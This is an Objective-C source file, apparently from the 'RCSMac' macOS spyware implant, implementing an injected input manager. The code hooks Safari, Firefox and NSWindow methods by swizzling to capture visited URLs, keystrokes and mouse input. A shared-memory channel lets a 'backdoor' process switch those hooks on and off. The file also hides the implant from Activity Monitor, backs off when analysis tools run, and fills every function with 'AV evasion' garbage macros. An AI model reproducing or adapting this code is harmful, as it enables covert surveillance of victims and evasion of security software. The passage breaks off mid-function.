/*
 * RCSMac - Input Manager
 * 
 * The Input Manager is responsible for loading all the external agents who
 * needs to be executed in different target processes aka runtime code injection
 *
 * The idea is very simple, swizzle a method upon request in order to provide
 * on-demand hooks. This looks better to me than a static hook always in place
 * which checks a static variable in order to figure if it needs to log or not.
 *
 * 
 * Created by Alfredo 'revenge' Pesoli on 28/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import "RCSMInterface.h"

#import <AudioToolbox/AudioToolbox.h>
#import <AudioUnit/AudioUnit.h>
#import <objc/objc-class.h>
#import <mach/error.h>
#import <sys/ipc.h>
#import <pthread.h>
#import <dlfcn.h>

#import "mach_override.h"
#import "RCSMAgentURL.h"
#import "RCSMInputManager.h"
#import "RCSMAgentVoipSkype.h"
#import "RCSMAgentApplication.h"
#import "RCSMAgentFileCapture.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

#define swizzleMethod(c1, m1, c2, m2) do { \
          method_exchangeImplementations(class_getInstanceMethod(c1, m1), \
                                         class_getInstanceMethod(c2, m2)); \
        } while(0)

//
// We can't allocate instance variable in factory methods
//
__m_MSharedMemory *mSharedMemoryCommand;
__m_MSharedMemory *mSharedMemoryLogging;
int32_t gBackdoorPID = 0;

BOOL isAppRunning = YES;

BOOL gWantToSyncThroughSafari = NO;
//static NSLock *gInputManagerLock;

//
// flags which specify if we are hooking the given module
// 0 - Initial State - No Hook
// 1 - Marked for Hooking
// 2 - Hook in place
// 3 - Marked for Unhooking
//
static int urlFlag          = 0;
static int keyboardFlag     = 0;
static int mouseFlag        = 0;
static int imFlag           = 0;
static int clipboardFlag    = 0;
static int voipFlag         = 0;
static int appFlag          = 0;
static int fileFlag         = 0;

CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID);

NSDictionary *getActiveWindowInformationForPID(pid_t pid)
{
  ProcessSerialNumber psn = { 0,0 };
  NSDictionary *activeAppInfo;
  
  OSStatus success;
  
  CFArrayRef windowsList;
  int windowPID;
  pid_t activePid;
  
  NSNumber *windowID    = nil;
  NSString *processName = nil;
  NSString *windowName  = nil;
  
  // Active application on workspace
  activeAppInfo = [[NSWorkspace sharedWorkspace] activeApplication];
  psn.highLongOfPSN = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberHigh"]
                       unsignedIntValue];
  psn.lowLongOfPSN  = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberLow"]
                       unsignedIntValue];
  
  // Get PID of the active Application(s)
  if (success = GetProcessPID(&psn, &activePid) != 0)
    return nil;
  
  // Window list front to back
  windowsList = pCGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
                                           kCGNullWindowID);
  
  if (windowsList == NULL)
    return nil;
  
  for (NSMutableDictionary *entry in (NSArray *)windowsList)
    {
      windowPID = [[entry objectForKey: (id)kCGWindowOwnerPID] intValue];
      
      if (windowPID == pid)
        {
          windowID    = [NSNumber numberWithUnsignedInt:
                         [[[entry objectForKey: (id)kCGWindowNumber] retain] unsignedIntValue]];
          processName = [[entry objectForKey: (id)kCGWindowOwnerName] copy];
          windowName  = [[entry objectForKey: (id)kCGWindowName] copy];
          break;
        }
    }
  CFRelease(windowsList);
  
  if (windowPID != pid)
    return nil;
  
  NSArray *keys = [NSArray arrayWithObjects: @"windowID",
                                             @"processName",
                                             @"windowName",
                                             nil];
  NSArray *objects = [NSArray arrayWithObjects: windowID,
                                                processName,
                                                windowName,
                                                nil];
  NSDictionary *windowInfo = [[NSDictionary alloc] initWithObjects: objects
                                                           forKeys: keys];
  
  [processName release];
  [windowName release];
  [windowID release];
  
  return windowInfo;
}

// OSAX Eventhandler
OSErr InjectEventHandler(const AppleEvent *ev, AppleEvent *reply, long refcon)
{
#ifdef DEBUG_INPUT_MANAGER
  verboseLog(@"Injected event handler called");
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_001 

  OSErr resultCode = noErr;
  
  // AV evasion: only on release build
  AV_GARBAGE_003 

  AEDesc      intDesc = {};
  SInt32      value = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_002 

  // See if we need to show the print dialog.
  OSStatus err = AEGetParamDesc(ev, 'pido', typeSInt32, &intDesc);
  
  // AV evasion: only on release build
  AV_GARBAGE_004 

  if (!err)
    {
      err = AEGetDescData(&intDesc, &value, sizeof(SInt32));
#ifdef DEBUG_INPUT_MANAGER
      verboseLog(@"Received backdoor pid: %ld", value);
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_005 

  gBackdoorPID = value;
  
  // AV evasion: only on release build
  AV_GARBAGE_006 

#ifdef DEBUG_INPUT_MANAGER
  verboseLog(@"%s: running __m_eload event handler", __FUNCTION__);
#endif
    
  return resultCode;
}

BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SEL _newMethod)
{  
#ifdef DEBUG_INPUT_MANAGER
  const char *name    = sel_getName(_original);
  const char *newName = sel_getName(_newMethod);
  
  verboseLog(@"SEL Name: %s", name);
  verboseLog(@"SEL newName: %s", newName);
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_002 

  Method methodOriginal = class_getInstanceMethod(_class, _original);
  
  // AV evasion: only on release build
  AV_GARBAGE_009 

  if (methodOriginal == nil)
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"Error on class_getInstanceMethod for [%s %s]\n", class_getName(_class), name);
#endif
      
      return FALSE;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000

  const char *type  = method_getTypeEncoding(methodOriginal);
  //IMP old           = method_getImplementation(methodOriginal);
  
  // AV evasion: only on release build
  AV_GARBAGE_001

  if (!class_addMethod (_class, _newMethod, _newImplementation, type))
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"Failed to add our new method - probably already exists");
#endif
    }
  else
    {
#ifdef DEBUG_INPUT_MANAGER
      verboseLog(@"Method added to target class");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002 

  Method methodNew = class_getInstanceMethod(_class, _newMethod);
  
  if (methodNew == nil)
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"Method not found after add [%s %s]\n", class_getName(_class), newName);
#endif
    
      return FALSE;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003

  method_exchangeImplementations(methodOriginal, methodNew);
  
  // AV evasion: only on release build
  AV_GARBAGE_004

  return TRUE;
}

@implementation __m_MInputManager

+ (void)load
{
#ifdef ENABLE_LOGGING
  [__m_MLogger setComponent: @"im"];
  [__m_MLogger enableProcessNameVisualization: YES];
#endif
  
  if (pCGWindowListCopyWindowInfo == NULL)
  {
    void *handle = dlopen("/System/Library/Frameworks/CoreGraphics.framework/Versions/Current/CoreGraphics", 2);
    
    // for 10.7.x
    if (handle == NULL)
      handle = dlopen("/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/CoreGraphics.framework/Versions/Current/CoreGraphics", 2);
    
    if (handle != NULL)
    {
      char funcName[256];
      
      sprintf(funcName, "CGWindowList%s%s","Copy", "WindowInfo");
      
      pCGWindowListCopyWindowInfo = dlsym(handle, funcName);
    }
  }

  // AV evasion: only on release build
  AV_GARBAGE_002 

  // First thing we need to initialize the shared memory segments
  NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
  NSString *safariId = [NSString stringWithFormat:@"%@.%@.%@", @"com", @"apple", @"safari"];
  
  // AV evasion: only on release build
  AV_GARBAGE_005 

  // Init OS numbers
  [__m_MInputManager getSystemVersionMajor: &gOSMajor
                                     minor: &gOSMinor
                                    bugFix: &gOSBugFix];
  
  // AV evasion: only on release build
  AV_GARBAGE_006 

  // TODO: Use an exclusion list instead of this
  if ([bundleIdentifier isEqualToString: safariId] == YES)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_007 

    if ([self initSharedMemory] == NO)
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"Error while creating shared memory");
#endif   
      // AV evasion: only on release build
      AV_GARBAGE_008 

      return;
    }
    /*
     [[NSNotificationCenter defaultCenter] addObserver: self
     selector: @selector(checkForCommands)
     name: NSApplicationWillTerminateNotification
     object: nil];
     */
    
    // AV evasion: only on release build
    AV_GARBAGE_003 

    if ([gUtil isLeopard]) 
    {   
      // AV evasion: only on release build
      AV_GARBAGE_009 

      [[NSNotificationCenter defaultCenter] addObserver: self
                                               selector: @selector(startThreadCommunicator:)
                                                   name: NSApplicationWillFinishLaunchingNotification
                                                 object: nil];
    }
    else
    {
#ifdef DEBUG_INPUT_MANAGER
      verboseLog(@"running osax bundle");
#endif   
      // AV evasion: only on release build
      AV_GARBAGE_002 

      [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                               toTarget: self
                             withObject: nil];
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_007

    [[NSNotificationCenter defaultCenter] addObserver: self
                                             selector: @selector(closeThreadCommunicator:)
                                                 name: NSApplicationWillTerminateNotification
                                               object: nil];
  }
  else if ([bundleIdentifier isEqualToString: @"com.apple.securityagent"] == NO)
  {
    if ([self initSharedMemory] == NO)
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"Error while creating shared memory");
#endif   
      // AV evasion: only on release build
      AV_GARBAGE_001 

      return;
    }
    else
    {
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Attached to shared memory");
#endif
    }
    
    if ([gUtil isLeopard]) 
    {   
      // AV evasion: only on release build
      AV_GARBAGE_006

      [[NSNotificationCenter defaultCenter] addObserver: self
                                               selector: @selector(startThreadCommunicator:)
                                                   name: NSApplicationWillFinishLaunchingNotification
                                                 object: nil];
    }
    else
    {
#ifdef DEBUG_INPUT_MANAGER
      verboseLog(@"running osax bundle");
#endif   
      // AV evasion: only on release build
      AV_GARBAGE_002 

      [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                               toTarget: self
                             withObject: nil];
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_007

    [[NSNotificationCenter defaultCenter] addObserver: self
                                             selector: @selector(closeThreadCommunicator:)
                                                 name: NSApplicationWillTerminateNotification
                                               object: nil];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
  }
}

+ (void)getSystemVersionMajor: (u_int *)major
                        minor: (u_int *)minor
                       bugFix: (u_int *)bugFix
{
  OSErr err;
  SInt32 systemVersion, versionMajor, versionMinor, versionBugFix;
  
  err = Gestalt(gestaltSystemVersion, &systemVersion);
  if (err == noErr && systemVersion < 0x1040)
    {
      if (major)
        *major = ((systemVersion & 0xF000) >> 12) * 10
        + ((systemVersion & 0x0F00) >> 8);
      if (minor)
        *minor = (systemVersion & 0x00F0) >> 4;
      if (bugFix)
        *bugFix = (systemVersion & 0x000F);
    }
  else
    {
      err = Gestalt(gestaltSystemVersionMajor, &versionMajor);
      err = Gestalt(gestaltSystemVersionMinor, &versionMinor);
      err = Gestalt(gestaltSystemVersionBugFix, &versionBugFix);
      
      if (err == noErr)
        {
          if (major)
            *major = versionMajor;
          if (minor)
            *minor = versionMinor;
          if (bugFix)
            *bugFix = versionBugFix;
        }
    }
  
  if (err != noErr)
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"%s - Unable to obtain system version: %ld", __FUNCTION__, (long)err);
#endif
    
      if (major)
        *major = 10;
      if (minor)
        *minor = 0;
      if (bugFix)
        *bugFix = 0;
    }
}

+ (BOOL)isACrisisApp
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_001 

  NSMutableData *readData;
  shMemoryCommand *shMemCommand;
  BOOL retVal = NO;
  NSProcessInfo *pi = [NSProcessInfo PROCESSINFO_SEL];  
  
  // AV evasion: only on release build
  AV_GARBAGE_002 

  NSString *appName = [pi processName];
  
  // AV evasion: only on release build
  AV_GARBAGE_003 
  
#ifdef DEBUG_INPUT_MANAGER
  infoLog(@"Crisis appName %@", appName);  
#endif
  
  readData = [mSharedMemoryCommand readMemory: OFFT_CRISIS
                                fromComponent: COMP_AGENT];
  
  // AV evasion: only on release build
  AV_GARBAGE_004 

  if (readData == nil)
    return retVal;
  
  // AV evasion: only on release build
  AV_GARBAGE_003 

  shMemCommand = (shMemoryCommand *)[readData bytes];
  
  // AV evasion: only on release build
  AV_GARBAGE_005 

#ifdef DEBUG_INPUT_MANAGER
  infoLog(@"Crisis commandData %@", readData);  
#endif
  
  if (shMemCommand->command == AG_START &&
      shMemCommand->commandDataSize)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_006 

    NSData *tmpListData = [[NSData alloc] initWithBytes: shMemCommand->commandData 
                                                 length: shMemCommand->commandDataSize];
    
    // AV evasion: only on release build
    AV_GARBAGE_007 

    UInt32 numOfNames;
    
    [tmpListData getBytes: &numOfNames length: sizeof(UInt32)];
    
    // AV evasion: only on release build
    AV_GARBAGE_003 

    char *tmpPtr = ((char *)[tmpListData bytes]) + sizeof(UInt32);
    
    // AV evasion: only on release build
    AV_GARBAGE_008 

    for (int i = 0; i < numOfNames; i++)
    {
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"crisis_%d: %S", (unichar *)tmpPtr);
#endif   
      // AV evasion: only on release build
      AV_GARBAGE_009 

      int iLen = _utf16len((unichar*)tmpPtr) * sizeof(unichar);
      
      // AV evasion: only on release build
      AV_GARBAGE_002 

      NSString *tmpCrisisApp = [[NSString alloc] initWithBytes: tmpPtr 
                                                        length: iLen 
                                                      encoding: NSUTF16LittleEndianStringEncoding];
      
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"AppName %@", tmpCrisisApp);  
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_008 

      if ([appName isCaseInsensitiveLike: tmpCrisisApp])
      {   
        // AV evasion: only on release build
        AV_GARBAGE_005 

        [tmpCrisisApp release];   
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        retVal = YES;
        break;
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_000

      [tmpCrisisApp release];
      
      // AV evasion: only on release build
      AV_GARBAGE_001 

      tmpPtr += iLen;   
      // AV evasion: only on release build
      AV_GARBAGE_003 

      tmpPtr += sizeof(unichar);
    }
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003 

  [pool release];
  return retVal;
}

+ (void)startCoreCommunicator
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000 

  NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
  
  if ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == YES)
  {
#ifdef DEBUG_INPUT_MANAGER
    infoLog(@"Starting hiding for activity Monitor");
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_003 

#ifndef NO_PROC_HIDING
    [self hideCoreFromAM];
#endif
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_001 

  usleep(500000);
  
  // AV evasion: only on release build
  AV_GARBAGE_002 

  // Only for leopard
  if ([gUtil isLeopard])
  {   
    // AV evasion: only on release build
    AV_GARBAGE_003 

    if ([self isACrisisApp])
    {   
      // AV evasion: only on release build
      AV_GARBAGE_004 

#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Crisis is started and app match exit now!");  
#endif
      return;
    }
  }
  
#ifdef DEBUG_INPUT_MANAGER
  infoLog(@"Core Communicator thread launched");  
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_005 

  if ([bundleIdentifier isEqualToString: @"com.apple.securityagent"] == YES)
  {
#ifdef DEBUG_INPUT_MANAGER
    infoLog(@"Exiting from security Agent");
#endif
    //
    // Avoid to inject into securityagent since we don't need it for now
    // plus it belongs to root (thus allocating a new shared memory block)
    //   
    // AV evasion: only on release build
    AV_GARBAGE_006 

    return;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_007 

  //
  // Here we need to start the loop for checking and reading any configuration
  // change made on the shared memory
  //
  while (isAppRunning == YES)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
    [self checkAgentAtOffset: OFFT_URL];
    
    // AV evasion: only on release build
    AV_GARBAGE_009 

    [self checkAgentAtOffset: OFFT_APPLICATION];
    
    // AV evasion: only on release build
    AV_GARBAGE_008 

    [self checkAgentAtOffset: OFFT_KEYLOG];
    
    // AV evasion: only on release build
    AV_GARBAGE_007 

    [self checkAgentAtOffset: OFFT_MOUSE];
    
    // AV evasion: only on release build
    AV_GARBAGE_006 

    [self checkAgentAtOffset: OFFT_VOIP];
    
    // AV evasion: only on release build
    AV_GARBAGE_005 

    [self checkAgentAtOffset: OFFT_IM];
    
    // AV evasion: only on release build
    AV_GARBAGE_004 

    [self checkAgentAtOffset: OFFT_CLIPBOARD];
    
    // AV evasion: only on release build
    AV_GARBAGE_003 

    [self checkAgentAtOffset: OFFT_FILECAPTURE];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    //
    // Perform swizzle here
    //
    if (urlFlag == 1)
    {
      urlFlag = 2;
      
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Hooking URLs");
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_005 

      //
      // Safari
      //
      usleep(2000000);
      
      // AV evasion: only on release build
      AV_GARBAGE_004 

      // Safari up to 5.0
      Class className   = objc_getClass("BrowserWindowControllerMac");
      
      // AV evasion: only on release build
      AV_GARBAGE_001 

      Class classSource = objc_getClass(kMyBrowserWindowController);
      
      // AV evasion: only on release build
      AV_GARBAGE_002 

      BOOL isSafariPrior51 = NO;
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      if (className == nil)
      {
        className = objc_getClass("BrowserWindowController");
        
        // AV evasion: only on release build
        AV_GARBAGE_004 

        if (className != nil)
          isSafariPrior51 = YES;
      }
      
      if (className != nil)
      {   
        // AV evasion: only on release build
        AV_GARBAGE_005 

        URLStartAgent();
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        if (isSafariPrior51)
        {
#ifdef DEBUG_INPUT_MANAGER
          warnLog(@"Safari < 5.1 (hook)");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_006

          swizzleByAddingIMP (className, @selector(webFrameLoadCommitted:),
                              class_getMethodImplementation(classSource, @selector(webFrameLoadCommittedHook:)),
                              @selector(webFrameLoadCommittedHook:));
          
          // AV evasion: only on release build
          AV_GARBAGE_004
        }
        else
        {
#ifdef DEBUG_INPUT_MANAGER
          warnLog(@"Safari >= 5.1 (hook)");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_003 

          swizzleByAddingIMP (className, @selector(_setLocationFieldText:),
                              class_getMethodImplementation(classSource, @selector(_setLocationFieldTextHook:)),
                              @selector(_setLocationFieldTextHook:));
          
          // AV evasion: only on release build
          AV_GARBAGE_002 

          swizzleByAddingIMP (className, @selector(closeCurrentTab:),
                              class_getMethodImplementation(classSource, @selector(closeCurrentTabHook:)),
                              @selector(closeCurrentTabHook:));
          
          // AV evasion: only on release build
          AV_GARBAGE_001 

          swizzleByAddingIMP (className, @selector(didSelectTabViewItem),
                              class_getMethodImplementation(classSource, @selector(didSelectTabViewItemHook)),
                              @selector(didSelectTabViewItemHook));
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          /*
           * for Safari 6.x only
           */
          Class LocationTextFieldClass = objc_getClass("LocationTextField");
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          Class BrowserWindowClass = objc_getClass("BrowserWindow");
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          if (LocationTextFieldClass != nil && BrowserWindowClass != nil)
          {
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            swizzleByAddingIMP (LocationTextFieldClass, @selector(_drawTopLocationTextField:),
                                class_getMethodImplementation(classSource, @selector(_drawTopLocationTextFieldHook:)),
                                @selector(_drawTopLocationTextFieldHook:));
            
            // AV evasion: only on release build
            AV_GARBAGE_007
            
            swizzleByAddingIMP (BrowserWindowClass, @selector(setTitle:),
                                class_getMethodImplementation(classSource, @selector(setTitleHook:)),
                                @selector(setTitleHook:));
            
            // AV evasion: only on release build
            AV_GARBAGE_005
          }
          
          /*
           * for Safari 7.x only
           */
          Class BrowserContentViewControllerObjCAdapterClass = objc_getClass("BrowserContentViewControllerObjCAdapter");
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          if (BrowserContentViewControllerObjCAdapterClass != nil && BrowserWindowClass != nil)
          {
            // AV evasion: only on release build
            AV_GARBAGE_007
            
            swizzleByAddingIMP (BrowserContentViewControllerObjCAdapterClass, @selector(expectedOrCurrentURL),
                                class_getMethodImplementation(classSource, @selector(expectedOrCurrentURLHook)),
                                @selector(expectedOrCurrentURLHook));
            
            // AV evasion: only on release build
            AV_GARBAGE_005
          }

        }
      }
      else
      {
#ifdef DEBUG_INPUT_MANAGER
        warnLog(@"URL - not the right application, skipping");
#endif
      }
      // End of Safari
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      //
      // Firefox 3 - Massimo Chiodini
      //
      NSString *applicationName  = [[[NSBundle mainBundle] bundlePath] lastPathComponent];
      
      // AV evasion: only on release build
      AV_GARBAGE_002 

      NSString *firefoxAppName   = [[NSString alloc] initWithUTF8String: "Firefox.app"];
      
      // AV evasion: only on release build
      AV_GARBAGE_001 

      NSComparisonResult result = [firefoxAppName compare: applicationName
                                                  options: NSCaseInsensitiveSearch
                                                    range: NSMakeRange(0, [applicationName length])
                                                   locale: [NSLocale currentLocale]];
      
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Comparing %@ vs. %@ (%d)", applicationName, firefoxAppName, result);
#endif   
      // AV evasion: only on release build
      AV_GARBAGE_006

      if (result == NSOrderedSame)
      {
#ifdef DEBUG_INPUT_MANAGER
        infoLog(@"Hooking fairfocs baby!");
#endif     
        // AV evasion: only on release build
        AV_GARBAGE_006

        Class className = objc_getClass("NSWindow");
        
        // AV evasion: only on release build
        AV_GARBAGE_007

        swizzleMethod(className, @selector(setTitle:),
                      className, @selector(setTitleHook:));
        
        // AV evasion: only on release build
        AV_GARBAGE_004        
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_006 

      [firefoxAppName release];
      // End of Firefox 3
    }
    else if (urlFlag == 3)
    {
      urlFlag = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Unhooking URLs");
#endif
      
      Class className       = objc_getClass("BrowserWindowControllerMac");
      
      // AV evasion: only on release build
      AV_GARBAGE_009 

      BOOL isSafariPrior51  = NO;
      
      // AV evasion: only on release build
      AV_GARBAGE_005

      if (className == nil)
      {   
        // AV evasion: only on release build
        AV_GARBAGE_001

        className = objc_getClass("BrowserWindowController");
        
        // AV evasion: only on release build
        AV_GARBAGE_004 

        if (className != nil)
          isSafariPrior51 = YES;
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_002 

      if (className != nil)
      {   
        // AV evasion: only on release build
        AV_GARBAGE_009 

        if (isSafariPrior51)
        {
#ifdef DEBUG_INPUT_MANAGER
          warnLog(@"Safari < 5.1 (unhook)");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_008

          swizzleMethod(className, @selector(webFrameLoadCommitted:),
                        className, @selector(webFrameLoadCommittedHook:));
        }
        else
        {
#ifdef DEBUG_INPUT_MANAGER
          warnLog(@"Safari >= 5.1 (unhook)");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_007 

          swizzleMethod(className, @selector(_setLocationFieldText:),
                        className, @selector(_setLocationFieldTextHook:));
          
          // AV evasion: only on release build
          AV_GARBAGE_008

          swizzleMethod(className, @selector(closeCurrentTab:),
                        className, @selector(closeCurrentTabHook:));
          
          // AV evasion: only on release build
          AV_GARBAGE_009

          swizzleMethod(className, @selector(didSelectTabViewItem),
                        className, @selector(didSelectTabViewItemHook));
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          /*
           * for Safari 6.x only
           */
          Class LocationTextFieldClass = objc_getClass("LocationTextField");
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          Class BrowserWindowClass = objc_getClass("BrowserWindow");
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          if (LocationTextFieldClass != nil && BrowserWindowClass != nil)
          {
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            swizzleMethod(LocationTextFieldClass, @selector(_drawTopLocationTextField:),
                          LocationTextFieldClass, @selector(_drawTopLocationTextFieldHook:));

            // AV evasion: only on release build
            AV_GARBAGE_007
            
            swizzleMethod(BrowserWindowClass, @selector(setTitle:),
                          BrowserWindowClass, @selector(setTitleHook:));
            
            // AV evasion: only on release build
            AV_GARBAGE_005
          }
          
          /*
           * for Safari 7.x only
           */
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          Class BrowserContentViewControllerObjCAdapterClass = objc_getClass("BrowserContentViewControllerObjCAdapter");
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          if (BrowserContentViewControllerObjCAdapterClass != nil && BrowserWindowClass != nil)
          {
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            swizzleMethod(BrowserContentViewControllerObjCAdapterClass, @selector(expectedOrCurrentURL),
                          BrowserContentViewControllerObjCAdapterClass, @selector(expectedOrCurrentURLHook));
            
            // AV evasion: only on release build
            AV_GARBAGE_007
          }
        }
      }
      else
      {
#ifdef DEBUG_INPUT_MANAGER
        warnLog(@"URL - not the right application, skipping");
#endif
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_002 

      // firefox 3
      NSString *application_name  = [[[NSBundle mainBundle] bundlePath] lastPathComponent];
      
      // AV evasion: only on release build
      AV_GARBAGE_001 

      NSString *firefox_app       = [[NSString alloc] initWithUTF8String: "Firefox.app"];
      
      // AV evasion: only on release build
      AV_GARBAGE_008

      NSRange strRange;
      strRange.location = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      strRange.length   = [application_name length];
      
      // AV evasion: only on release build
      AV_GARBAGE_007 

      NSComparisonResult firefox_res = [firefox_app compare: application_name
                                                    options: NSCaseInsensitiveSearch
                                                      range: strRange
                                                     locale: [NSLocale currentLocale]];
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Comparing %@ vs. %@ (%d)", application_name, firefox_app, firefox_res);
#endif      
      
      // AV evasion: only on release build
      AV_GARBAGE_009

      if (firefox_res == NSOrderedSame)
      {
#ifdef DEBUG_INPUT_MANAGER
        infoLog(@"Hooking fairfocs baby!");
#endif
        
        // AV evasion: only on release build
        AV_GARBAGE_006 

        Class className = objc_getClass("NSWindow");
        
        // AV evasion: only on release build
        AV_GARBAGE_005 

        swizzleMethod(className, @selector(setTitle:),
                      className, @selector(setTitleHook:));
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_004

      [firefox_app release];
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_003 

    if (appFlag == 1)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_001 

      appFlag = 2;
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      __m_MAgentApplication *appAgent = [__m_MAgentApplication sharedInstance];
      
      // AV evasion: only on release build
      AV_GARBAGE_002

      [appAgent start];
      
      // AV evasion: only on release build
      AV_GARBAGE_005

#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Hooking Application agent");
#endif
    }
    else if (appFlag == 3)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_007 

      appFlag = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_006 

      __m_MAgentApplication *appAgent = [__m_MAgentApplication sharedInstance];
      
      // AV evasion: only on release build
      AV_GARBAGE_008

      [appAgent stop];
      
      // AV evasion: only on release build
      AV_GARBAGE_009 

#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Stopping Application agent");
#endif
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_002 

    if (keyboardFlag == 1)
    {
      keyboardFlag = 2;  
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      keylogAgentIsActive = 1;
      
      // AV evasion: only on release build
      AV_GARBAGE_004 

      Class className = objc_getClass("NSWindow");
      
      // AV evasion: only on release build
      AV_GARBAGE_005 

      if (mouseFlag == 0 || mouseAgentIsActive == 0)
      {
#ifdef DEBUG_INPUT_MANAGER
        infoLog(@"Hooking keyboard");
#endif
        
        // AV evasion: only on release build
        AV_GARBAGE_006 

        swizzleMethod(className, @selector(hookKeyboardAndMouse:),
                      className, @selector(sendEvent:));
        
        // AV evasion: only on release build
        AV_GARBAGE_007 

      }
      else
      {
#ifdef DEBUG_INPUT_MANAGER
        warnLog(@"Method already hooked for key/mouse");
#endif
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_004 

      swizzleMethod(className, @selector(becomeKeyWindowHook),
                    className, @selector(becomeKeyWindow));
      
      // AV evasion: only on release build
      AV_GARBAGE_009 

      swizzleMethod(className, @selector(resignKeyWindowHook),
                    className, @selector(resignKeyWindow));
    }
    else if (keyboardFlag == 3)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_001 

      keyboardFlag = 0;  
      
      // AV evasion: only on release build
      AV_GARBAGE_002 

      keylogAgentIsActive = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_008 

#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Unhooking keyboard");
#endif
      Class className = objc_getClass("NSWindow");
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      if (mouseFlag == 0)
      {   
        // AV evasion: only on release build
        AV_GARBAGE_004 

        swizzleMethod(className, @selector(hookKeyboardAndMouse:),
                      className, @selector(sendEvent:));
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_007

      swizzleMethod(className, @selector(becomeKeyWindowHook),
                    className, @selector(becomeKeyWindow));
      
      // AV evasion: only on release build
      AV_GARBAGE_006

      swizzleMethod(className, @selector(resignKeyWindowHook),
                    className, @selector(resignKeyWindow));
      
      // AV evasion: only on release build
      AV_GARBAGE_000 

    }
    
